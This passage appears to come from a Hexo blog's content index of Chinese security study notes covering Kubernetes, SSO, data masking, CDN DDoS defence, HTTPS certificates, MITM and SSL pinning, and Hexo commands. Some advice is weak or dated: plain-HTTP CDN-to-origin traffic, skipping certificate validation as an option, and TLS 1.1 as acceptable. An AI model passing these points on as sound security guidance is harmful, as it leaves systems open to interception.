title=\"Kubernetes\"></a>Kubernetes</h3><p>K8s容器集群管理系统：启动容器，自动化部署、扩展和管理容器，回收容器。<br>K8S负责管理容器跑在哪个机器上，监控容器的存在，控制容器与外界通讯。<br>Docker：创建容器<br>K8S：编排容器</p>\n<p>一般不会把整个应用及其依赖的服务打到一个镜像，用一个容器来跑。常见的做法是database和webserver用独立的镜像，独立的容器来跑，然后用docker-compose或者k8s之类的工具将一批容器组织成一个应用单元</p>\n<p>Pod：容器集合，调度的基本单元<br>Node：物理节点<br>service：pod的访问代理抽象，一个service可映射N个pod</p>\n<p>不要在单个容器里面运行多个进程</p>\n<p>不要把认证口令存在镜像中，用环境变量比较好</p>\n<p>不要将数据储存在容器中，容器销毁了里面的数据也没了，要将数据写入volumes</p>\n<h3 id=\"Q-amp-A\"><a href=\"#Q-amp-A\" class=\"headerlink\" title=\"Q&amp;A\"></a>Q&amp;A</h3><hr>\n<p>Q：一个容器，一个镜像，谁的概念大？<br>A：镜像和容器的关系，类似“类”和“实例”，镜像是静态的定义，容器是镜像运行时的实体，容器可以被创建、启动、停止、删除、暂停等</p>\n<hr>\n<p>Q：Dockerfile是干啥用的？<br>A：是个文本文件，用来清晰的记录镜像的构建过程，即在基础镜像之上，执行哪些命令才能制作成你的镜像</p>\n<hr>\n<p>Q：制作自己的镜像，有哪些方法？<br>A：<br>1、通过创建Dockerfile，执行docker build命令自动编译生成镜像，✲推荐✲<br>2、通过run一个镜像，在这个容器内敲些命令、操作，最后执行docker commit命令提交，打包生成镜像（俗称黑箱镜像，就是除了制作镜像的人知道执行过什么命令、怎么生成的镜像，别人根本无从得知）</p>\n<hr>\n<p>Q：war、jar包会打包进基础镜像中吗？还是制作成一个单独的镜像？<br>A：编写Dockerfile，jar包直接部署在Docker中，而war包需要先部署在Tomcat基础镜像中再部署在Docker中<br>A：构建时打包进基础镜像中，生成自己系统的最终镜像</p>\n","categories":["容器","云平台"],"tags":["容器安全"]},{"title":"keepalived","url":"/2019/11/28/keepalived/","content":"<p><img src=\"/images/keepalived.jpg\" alt=\"\"></p>\n","categories":["keepalived"],"tags":["负载均衡"]},{"title":"sso","url":"/2019/11/28/sso/","content":"<p><img src=\"/images/sso.png\" alt=\"\"><a id=\"more\"></a></p>\n<h3 id=\"鉴权-黑猫-UM（统一模板，控制子菜单权限）\"><a href=\"#鉴权-黑猫-UM（统一模板，控制子菜单权限）\" class=\"headerlink\" title=\"鉴权:黑猫/UM（统一模板，控制子菜单权限）\"></a>鉴权:黑猫/UM（统一模板，控制子菜单权限）</h3><h3 id=\"SSO-统一认证系统-单点登录\"><a href=\"#SSO-统一认证系统-单点登录\" class=\"headerlink\" title=\"SSO:统一认证系统/单点登录\"></a>SSO:统一认证系统/单点登录</h3><p>实现效果：访问A系统，右上角点击登录，跳转到SSO认证页面，认证通过后，返回A系统。又访问B系统，无须登录可访问B。<br><img src=\"/images/sso1.jpg\" alt=\"SSO流程图\"><br>8、应用A拿到user的Token，要发给SSO去校验，不校验直接返回页面给user，是不安全的。校验Token是SSO的活，因为是它生成的Token<br>9、SSO校验Token是否真实，返回True/False给应用A。应用A将用户信息存在session中，当用户下次访问应用A时，应用A检测session中是否存在，如果存在将不会再访问SSO</p>\n<h3 id=\"AD：域账号（存储用户的账号-密码）\"><a href=\"#AD：域账号（存储用户的账号-密码）\" class=\"headerlink\" title=\"AD：域账号（存储用户的账号/密码）\"></a>AD：域账号（存储用户的账号/密码）</h3><p>若C系统不接SSO，直接用AD登录C系统自带的登陆页面，登录成功后，访问D系统，依然还得登录= =!</p>\n","categories":["sso"],"tags":["sso"]},{"title":"数据脱敏","url":"/2019/11/26/%E8%84%B1%E6%95%8F/","content":"<h3 id=\"数据脱敏评审点\"><a href=\"#数据脱敏评审点\" class=\"headerlink\" title=\"数据脱敏评审点\"></a>数据脱敏评审点</h3><p>1、频率<br>2、数量级 <code>全量/抽样</code><br>3、表、字段，样例及注释<br>4、敏感信息字段是否脱敏，脱敏方式。<code>*模糊、MD5、加密等</code><br>5、最小化原则，是否必须提供</p>\n","categories":["安全评审"],"tags":["数据脱敏"]},{"title":"CDN安全","url":"/2019/11/19/cdn/","content":"<h3 id=\"DDos一般D的是流量\"><a href=\"#DDos一般D的是流量\" class=\"headerlink\" title=\"DDos一般D的是流量\"></a>DDos一般D的是流量</h3><h3 id=\"CC攻击针对域名，制造大量的链接\"><a href=\"#CC攻击针对域名，制造大量的链接\" class=\"headerlink\" title=\"CC攻击针对域名，制造大量的链接\"></a>CC攻击针对域名，制造大量的链接</h3><p>隐藏服务器真实IP地址是最好的方法。<br>服务器前加个CDN中转，或买个高防的盾机。域名解析DNS上解析的是CDN，子网站也映射给CDN</p>\n<a id=\"more\"></a>\n<blockquote>\n<p>1、无论什么时候都要隐藏真实IP<br>2、购买CDN来抗DDoS不一定全程抗住，比较运营商会果断的屏蔽你的域名<br>3、DDoS是一个长久对抗的话题，尤其是应对大流量的攻击更是需要时间来磨，防守同样需要大量的资金注入，比如流量需要钱，盾机需要钱等等，主要看业务的损失来衡量需不需要投入大量的金钱去维护了。<br>4、回源是什么意思：当cdn缓存服务器没有客户端请求的资源，就会回我们的服务器上获取资源。回源地址可以是IP回源、域名回源。<br><code>客户端 ---( https)---&gt; CDN ---( https)---&gt; 源站（这个是跟随场景）</code><br><code>客户端 ---( https)---&gt; CDN ---( http)----&gt; 源站（这个是限定http）</code><br>5、CDN设置为http回源，CDN使用https就行了，不要用协议跟随（固定死CDN–&gt;源站走HTTP）。<br>6、源站域名和加速域名（用户看到的）不能一样，加速域名必须要在工信部备案，源站域名不要求备案，但需要公网能正常解析。<br>7、回源host（回源域名）是CDN请求源站时请求头中的host字段，请求源站上哪个目录web站点。可以是加速域名、源站域名、自定义URL。也可以不填写（但<strong>回源地址</strong>必须要配置，回源host可选）<br>8、加速域名走https的话，需要把网站私钥给CDN服务商</p>\n</blockquote>\n","categories":["CDN"],"tags":["CDN安全"]},{"title":"信息安全体系搭建","url":"/2019/11/19/security/","content":"<h3 id=\"互联网企业\"><a href=\"#互联网企业\" class=\"headerlink\" title=\"互联网企业\"></a>互联网企业</h3><p>1、安全测试团队，渗透测试团队，SDL流程审核<br>2、安全应急响应（xSRC），对外宣传和白帽子漏洞处理<br>3、数据及隐私合规评审，安全认证，大数据治理<br>4、安全研发团队，自研WAF、HIDS、内容识别、流量分析、密钥管理系统<br>5、安全风控，拦截薅羊毛/抢红包，触发验证码功能，用户画像/设备画像/威胁情报</p>\n<h3 id=\"传统企业\"><a href=\"#传统企业\" class=\"headerlink\" title=\"传统企业\"></a>传统企业</h3><p>1、办公安全，堆设备，买买买！！如Macfee防病毒、深信服VPN、齐志、深信服上网行为管理、Imperva、IPS、Repid7、splunk<br>2、安全制度制定，安全证书认证，等保2.0，27001，CSTAR<br>3、安全顾问、评审、安全测试、开墙审批<br>4、安全研发，SIEM日志收集，态势感知攻击WEB，Wazuh适配，云上产品研发，SOAR安全事件响应</p>\n<p><img src=\"/images/%E4%B8%9A%E5%8A%A1%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E6%A2%AF%E5%BA%A6.PNG\" alt=\"\"></p>\n","categories":["体系"],"tags":["信息安全"]},{"title":"HTTPS证书及中间人攻击","url":"/2019/11/17/https/","content":"<h3 id=\"HTTPS原理\"><a href=\"#HTTPS原理\" class=\"headerlink\" title=\"HTTPS原理\"></a>HTTPS原理</h3><ul>\n<li><a href=\"https://dabaotthao.com/2018/07/13/https/\" title=\"dabao&#39;s Blog\">浅谈https基本原理</a></li>\n<li><a href=\"https://www.cnblogs.com/handsomeBoys/p/6556336.html\" title=\"handsomeBoys\">CA证书扫盲，https讲解</a></li>\n<li><a href=\"https://www.2cto.com/article/201607/523509.html\" title=\"2016.06-白泽安全团队投稿的作品\">浅析HTTPS中间人攻击与证书校验</a></li>\n<li><a href=\"https://dishibolei.github.io/2017/05/11/https-safe-1/\" title=\"萝卜的空间\">IOS应用安全-HTTP/HTTPS网络安全</a></li>\n</ul>\n<p><img src=\"/images/diagrammatize_https_theory.jpg\" alt=\"HTTPS原理\"></p>\n<h3 id=\"证书\"><a href=\"#证书\" class=\"headerlink\" title=\"证书\"></a>证书</h3><p>1、证书=Server公钥+申请者与颁发者信息+签名<br>（<strong><code>CA的公钥</code></strong>公之于众，如浏览器内置，没有在证书中）<a id=\"more\"></a></p>\n<p>2、通过Internet直接传递Server公钥，不安全，易被中间人攻击，故引入有公信力的第三方CA，盖个戳</p>\n<p>3、服务端自己生成.csr<strong>证书请求文件</strong>和.key私钥，<strong><code>公钥</code></strong>可写死在客户端，也可公网从服务端获取证书（公钥）。</p>\n<p>4、申请证书不需要提供私钥，提交CSR（包含了公钥和标识名称）,确保私钥永远只能服务器掌握。</p>\n<p>5、一个证书可以签发多个域名、泛域名，多个域名共用一个公私钥对</p>\n<h3 id=\"如果是应用服务器（非浏览器）调第三方公网API，证书是怎么解决和校验？\"><a href=\"#如果是应用服务器（非浏览器）调第三方公网API，证书是怎么解决和校验？\" class=\"headerlink\" title=\"如果是应用服务器（非浏览器）调第三方公网API，证书是怎么解决和校验？\"></a>如果是应用服务器（非浏览器）调第三方公网API，证书是怎么解决和校验？</h3><p>要么应用服务器提前下载导入这个第三方用到的CA根证书，要么服务器忽略证书校验</p>\n<h3 id=\"在公网读写MySQL等数据库，建议开启SSL链路传输加密，校验MySQL服务端需要导入CA根证书到应用服务器，才能连数据库\"><a href=\"#在公网读写MySQL等数据库，建议开启SSL链路传输加密，校验MySQL服务端需要导入CA根证书到应用服务器，才能连数据库\" class=\"headerlink\" title=\"在公网读写MySQL等数据库，建议开启SSL链路传输加密，校验MySQL服务端需要导入CA根证书到应用服务器，才能连数据库\"></a>在公网读写MySQL等数据库，建议开启SSL链路传输加密，校验MySQL服务端需要导入CA根证书到应用服务器，才能连数据库</h3><h3 id=\"单向认证\"><a href=\"#单向认证\" class=\"headerlink\" title=\"单向认证\"></a>单向认证</h3><p>1、源端不做限制，对服务端进行验证，非公司内客户端都可以访问服务端。</p>\n<p>2、忽略校验证书，则服务端不可信，有风险。所有不可信的服务端都能访问，易受中间人攻击。</p>\n<p>3、严格意义上来说https下不存在中间人攻击，存在中间人攻击的前提条件是没有严格的对证书进行校验，或者人为的信任伪造证书</p>\n<p>4、自签的证书，客户端访问时，证书校验error，要么忽略校验，风险见上。要么使用自己定义的信任存储（trust store）代替APP系统自带的，即写死证书/公钥，见6</p>\n<p>5、市场上很多APP未做好证书校验，有的只做了部分校验，例如检查证书域名是否匹配证书、是否过期；更多的根本不做校验，于是造成了中间人攻击。此类校验虽然在导入Burp证书到客户端后造成中间人攻击，但攻击门槛已相对较高，对安全要求不是特别高的APP可采用此方法进行防御。</p>\n<p>6、为了防止中间人攻击，可以使用SSL-Pinning的技术来反抓包。客户端将预置的证书与从公网接收的证书做比较，如果一致，就建立连接，不走系统的证书信任链去校验，所以即使导入Burp CA公钥证书，也无法进行中间人攻击（抓包）。但相应的成本也会升高，见7</p>\n<p>7、如果服务器申请的<strong>证书到期</strong>(常见)或者因为泄露等其他原因需要<strong>更换</strong>证书，但这个证书又写死在客户端APP代码中，也就必须强制用户进行客户端升级。对安全有较高要求的app（如<code>金融</code>）用这种。</p>\n<p>8、SSL-pinning有两种方式：证书锁定和公钥锁定。</p>\n<ul>\n<li><strong>证书锁定</strong> （Certificate Pinning）</li>\n<li><strong>公钥锁定</strong> （Public Key Pinning，推荐）</li>\n</ul>\n<p>9、为避免强升的问题，针对6优化。<br>方案一:推荐公钥锁定，公钥在证书的续期前后都可以保持不变（即密钥对不变）<br>方案二:动态更新证书。Server生成一对RSA公私钥对，公钥硬编码在APP（<strong>证书公钥不用硬编码</strong>），私钥放服务器，APP启动的时候，证书信息通过私钥签名发送给客户端，APP用预置的公钥验签，得到证书信息埋入APP设置为锚点。发起https连接获取证书，对比两个证书是否一致进行校验。但效率降低了。</p>\n<p>10、抓包只能抓单向认证的</p>\n<h3 id=\"如果是应用服务器（非浏览器）调第三方公网HTTPS接口，证书是怎么解决和校验？\"><a href=\"#如果是应用服务器（非浏览器）调第三方公网HTTPS接口，证书是怎么解决和校验？\" class=\"headerlink\" title=\"如果是应用服务器（非浏览器）调第三方公网HTTPS接口，证书是怎么解决和校验？\"></a>如果是应用服务器（非浏览器）调第三方公网HTTPS接口，证书是怎么解决和校验？</h3><p>没啥区别，根证书通常是内置在操作系统或者执行环境（如JRE等）中。就像web浏览器一样，为HTTPS请求验证SSL证书（你直接调https接口，不用跳过证书校验，就可以访问）。</p>\n<h3 id=\"在公网读写MySQL等数据库，建议开启SSL链路传输加密，需要导入SSL-CA证书到应用服务器，才能连数据库。\"><a href=\"#在公网读写MySQL等数据库，建议开启SSL链路传输加密，需要导入SSL-CA证书到应用服务器，才能连数据库。\" class=\"headerlink\" title=\"在公网读写MySQL等数据库，建议开启SSL链路传输加密，需要导入SSL CA证书到应用服务器，才能连数据库。\"></a>在公网读写MySQL等数据库，建议开启SSL链路传输加密，需要导入SSL CA证书到应用服务器，才能连数据库。</h3><h3 id=\"双向认证\"><a href=\"#双向认证\" class=\"headerlink\" title=\"双向认证\"></a>双向认证</h3><p>校验客户端的身份，非授权客户端无法访问指定的服务端</p>\n<h3 id=\"加密协议\"><a href=\"#加密协议\" class=\"headerlink\" title=\"加密协议\"></a>加密协议</h3><p>等保要求，加密协议用<strong><code>TLS 1.1</code></strong>及以上版本，推荐<strong><code>TLS 1.2</code></strong><br>禁止使用<strong><code>TLS1.0</code></strong>、<strong><code>SSL2.0</code></strong>及<strong><code>SSL3.0</code></strong></p>\n","categories":["HTTPS"],"tags":["传输加密","SSL证书","HTTPS原理"]},{"title":"Hexo命令","url":"/2019/11/17/hexo/","content":"<h3 id=\"hexo常见操作\"><a href=\"#hexo常见操作\" class=\"headerlink\" title=\"hexo常见操作\"></a>hexo常见操作</h3><p><code>hexo new &quot;postName&quot;</code>#新建文章<br><code>hexo new page &quot;pageName&quot;</code>#新建页面<a id=\"more\"></a><br><code>hexo clean</code> #清除部署緩存<br><code>hexo n == hexo new</code> #新建文章<br><code>hexo g == hexo generate</code> #生成静态页面至public目录<br><code>hexo s == hexo server</code> #开启预览访问端口（默认端口4000，可在浏览器输入localhost:4000预览）<br><code>hexo d == hexo deploy</code> #将.deploy目录部署到GitHub<br><code>hexo g -d</code> #生成加部署<br><code>hexo g -s</code>#生成加预览</p>\n<h3 id=\"新建文章，默认的注释内容\"><a href=\"#新建文章，默认的注释内容\" class=\"headerlink\" title=\"新建文章，默认的注释内容\"></a>新建文章，默认的注释内容</h3><p>hexo/scaffolds/post.md</p>\n<h3 id=\"用户自定义样式\"><a href=\"#用户自定义样式\" class=\"headerlink\" title=\"用户自定义样式\"></a>用户自定义样式</h3><p>hexo/themes/next/source/css/_custom/custom.styl</p>\n<h3 id=\"文章信封区域宽度调整\"><a href=\"#文章信封区域宽度调整\" class=\"headerlink\" title=\"文章信封区域宽度调整\"></a>文章信封区域宽度调整</h3><p>source/css/_variables/custom.styl</p>\n","categories":["Hexo"],"tags":["Hexo命令及安装"]},{"title":"Hello World","url":"/2019/11/11/hello-world/","content":"<p>Welcome to <a href=\"https://hexo.io/\">Hexo</a>! This is your very first post. Check <a href=\"https://hexo.io/docs/\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\">GitHub</a>.</p>\n<h2 id=\"Quick-Start\"><a href=\"#Quick-Start\" class=\"headerlink\" title=\"Quick Start\"></a>Quick Start</h2><a id=\"more\"></a>\n<h3 id=\"Create-a-new-post\"><a href=\"#Create-a-new-post\" class=\"headerlink\" title=\"Create a new post\"></a>Create a new post</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">\"My New Post\"</span></span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/writing.html\">Writing</a></p>\n<h3 id=\"Run-server\"><a href=\"#Run-server\" class=\"headerlink\" title=\"Run server\"></a>Run server</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/server.html\">Server</a></p>\n<h3 id=\"Generate-static-files\"><a href=\"#Generate-static-files\" class=\"headerlink\" title=\"Generate static files\"></a>Generate static files</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/generating.html\">Generating</a></p>\n<h3 id=\"Deploy-to-remote-sites\"><a href=\"#Deploy-to-remote-sites\" class=\"headerlink\" title=\"Deploy to remote sites\"></a>Deploy to remote sites</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/one-command-deployment.html\">Deployment</a></p>\n"}]